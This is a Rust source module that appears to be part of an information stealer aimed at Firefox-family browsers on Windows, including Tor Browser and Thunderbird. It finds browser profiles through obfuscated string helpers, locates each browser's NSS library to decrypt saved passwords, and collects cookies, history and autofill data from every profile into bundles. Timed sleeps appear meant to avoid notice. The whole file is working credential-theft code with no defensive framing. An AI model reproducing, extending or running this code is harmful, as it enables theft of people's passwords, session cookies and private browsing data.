pub mod base;

use std::{env, path::PathBuf};
use crate::encrypted::*;
use crate::dbg_log;

pub struct GeckoBrowserInfo {
    pub name: String,
    pub profiles_path: PathBuf,
}

pub fn get_browsers() -> Vec<GeckoBrowserInfo> {
    let roaming = env::var("APPDATA").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();

    vec![
        GeckoBrowserInfo {
            name: s_gck_firefox(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_mozilla()).join(s_gck_firefox()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_firefox_esr(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_mozilla()).join(s_gck_firefox_esr()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_firefox_dev(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_mozilla()).join(s_gck_firefox_dev()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_waterfox(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_waterfox()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_waterfox_g5(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_waterfox()).join(s_gck_waterfox_g5()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_librewolf(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_librewolf()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_palemoon(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_moonchild()).join(s_gck_palemoon()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_basilisk(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_moonchild()).join(s_gck_basilisk()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_seamonkey(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_mozilla()).join(s_gck_seamonkey()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_floorp(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_floorp()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_thunderbird(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_thunderbird()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_tor(),
            profiles_path: PathBuf::from(&local)
                .join(s_gck_tor())
                .join(s_gck_tor_browser())
                .join(s_gck_torbrowser())
                .join(s_gck_tor_data())
                .join(s_gck_tor_browser()),
        },
        GeckoBrowserInfo {
            name: s_gck_kmeleon(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_kmeleon()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_icedragon(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_comodo()).join(s_gck_icedragon()).join(s_gck_profiles()),
        },
        GeckoBrowserInfo {
            name: s_gck_cyberfox(),
            profiles_path: PathBuf::from(&roaming).join(s_gck_eightpecx()).join(s_gck_cyberfox()).join(s_gck_profiles()),
        },
    ]
}

fn nss_candidates(browser_name: &str) -> Vec<PathBuf> {
    let pf = env::var("ProgramFiles").unwrap_or_default();
    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();

    match browser_name {
        n if n == s_gck_firefox() => vec![
            PathBuf::from(&pf).join(s_gck_mozilla_firefox_dir()),
            PathBuf::from(&pf86).join(s_gck_mozilla_firefox_dir()),
        ],
        n if n == s_gck_firefox_esr() => vec![
            PathBuf::from(&pf).join(s_gck_mozilla_firefox_esr_dir()),
            PathBuf::from(&pf86).join(s_gck_mozilla_firefox_esr_dir()),
            PathBuf::from(&pf).join(s_gck_mozilla_firefox_dir()),
        ],
        n if n == s_gck_firefox_dev() => vec![
            PathBuf::from(&pf).join(s_gck_firefox_dev_dir()),
            PathBuf::from(&pf86).join(s_gck_firefox_dev_dir()),
            PathBuf::from(&pf).join(s_gck_mozilla_firefox_dir()),
        ],
        n if n == s_gck_waterfox() || n == s_gck_waterfox_g5() => vec![
            PathBuf::from(&pf).join(s_gck_waterfox_dir()),
            PathBuf::from(&pf86).join(s_gck_waterfox_dir()),
            PathBuf::from(&local).join(s_gck_waterfox()),
        ],
        n if n == s_gck_librewolf() => vec![
            PathBuf::from(&pf).join(s_gck_librewolf_dir()),
            PathBuf::from(&pf86).join(s_gck_librewolf_dir()),
            PathBuf::from(&local).join(s_gck_librewolf()),
        ],
        n if n == s_gck_palemoon() => vec![
            PathBuf::from(&pf).join(s_gck_moonchild()).join(s_gck_palemoon_dir()),
            PathBuf::from(&pf86).join(s_gck_moonchild()).join(s_gck_palemoon_dir()),
            PathBuf::from(&pf).join(s_gck_palemoon()),
        ],
        n if n == s_gck_basilisk() => vec![
            PathBuf::from(&pf).join(s_gck_moonchild()).join(s_gck_basilisk_dir()),
            PathBuf::from(&pf86).join(s_gck_moonchild()).join(s_gck_basilisk_dir()),
        ],
        n if n == s_gck_seamonkey() => vec![
            PathBuf::from(&pf).join(s_gck_seamonkey_dir()),
            PathBuf::from(&pf86).join(s_gck_seamonkey_dir()),
        ],
        n if n == s_gck_floorp() => vec![
            PathBuf::from(&pf).join(s_gck_floorp_dir()),
            PathBuf::from(&pf86).join(s_gck_floorp_dir()),
            PathBuf::from(&local).join(s_gck_floorp()),
        ],
        n if n == s_gck_thunderbird() => vec![
            PathBuf::from(&pf).join(s_gck_thunderbird_dir()),
            PathBuf::from(&pf86).join(s_gck_thunderbird_dir()),
        ],
        n if n == s_gck_tor() => vec![
            PathBuf::from(&local).join(s_gck_tor()).join(s_gck_tor_browser()),
            PathBuf::from(&pf).join(s_gck_tor()).join(s_gck_tor_browser()),
        ],
        n if n == s_gck_kmeleon() => vec![
            PathBuf::from(&pf).join(s_gck_kmeleon_dir()),
            PathBuf::from(&pf86).join(s_gck_kmeleon_dir()),
        ],
        n if n == s_gck_icedragon() => vec![
            PathBuf::from(&pf).join(s_gck_comodo()).join(s_gck_icedragon_dir()),
            PathBuf::from(&pf86).join(s_gck_comodo()).join(s_gck_icedragon_dir()),
        ],
        n if n == s_gck_cyberfox() => vec![
            PathBuf::from(&pf).join(s_gck_cyberfox_dir()),
            PathBuf::from(&pf86).join(s_gck_cyberfox_dir()),
        ],
        _ => vec![
            PathBuf::from(&pf).join(s_gck_mozilla_firefox_dir()),
            PathBuf::from(&pf86).join(s_gck_mozilla_firefox_dir()),
        ],
    }
}

pub fn find_nss_dir(browser_name: &str) -> Option<PathBuf> {
    for path in nss_candidates(browser_name) {
        if path.join(s_gck_nss3_dll()).exists() {
            return Some(path);
        }
    }
    None
}

pub fn extract_all() -> Vec<(String, String)> {
    std::thread::sleep(std::time::Duration::from_millis(500));
    dbg_log!("gecko::extract_all BEGIN");
    let mut results = Vec::new();
    let browsers = get_browsers();
    dbg_log!("gecko: {} browsers registered", browsers.len());
    for browser in browsers {
        dbg_log!("gecko: browser '{}' profiles_path={:?} exists={}",
            browser.name, browser.profiles_path, browser.profiles_path.exists());
        if !browser.profiles_path.exists() { continue; }
        let nss_dir = find_nss_dir(&browser.name);
        dbg_log!("gecko: '{}' nss_dir={:?}", browser.name, nss_dir);
        let profiles = base::get_profiles(&browser.profiles_path);
        dbg_log!("gecko: '{}' {} profiles found", browser.name, profiles.len());

        for (profile_name, profile_path) in profiles {
            std::thread::sleep(std::time::Duration::from_millis(200));
            let passwords = nss_dir.as_ref()
                .and_then(|dir| base::extract_passwords_nss(&profile_path, dir));
            let cookies = base::extract_cookies(&profile_path);
            let history = base::extract_history(&profile_path);
            let autofill = base::extract_autofill(&profile_path);

            dbg_log!("gecko: '{}'/'{}' pwd={:?} cook={:?} auto={:?} hist={:?}",
                browser.name, profile_name,
                passwords.is_some(), cookies.is_some(),
                autofill.is_some(), history.is_some());

            crate::browsers::common::zipp::push_profile_bundle(
                &mut results, &browser.name, &profile_name,
                passwords, cookies, autofill, history,
            );
        }
    }
    dbg_log!("gecko::extract_all END results={}", results.len());
    results
}
